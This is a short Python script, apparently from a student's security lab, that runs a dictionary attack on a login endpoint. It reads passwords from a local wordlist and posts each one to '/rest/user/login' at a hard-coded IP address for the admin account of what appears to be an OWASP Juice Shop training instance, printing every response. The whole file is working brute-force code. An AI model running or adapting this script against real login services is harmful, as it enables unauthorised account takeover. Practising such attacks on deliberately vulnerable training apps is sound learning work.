import requests

def dictionary_attack():
    file_path="C:/Users/20221292/Desktop/Projets-1/Python/passwords_wordlist.txt"
    try:
        with open(file_path, 'r') as file:
            
            for i, line in enumerate(file):  # Iterate through the file lines
                word = line.strip()
                url= "http://35.175.136.38/rest/user/login"
                data = {
                    "email": "admin@juice-sh.op",
                    "password": word,
                }
                print("Testing password: "+word)
                response = requests.post(url, json=data)
                print (response.content)
    except FileNotFoundError:
        print(f"File not found: {file_path}")
            
    except Exception as e:
        print(f"An error occurred: {e}")

dictionary_attack()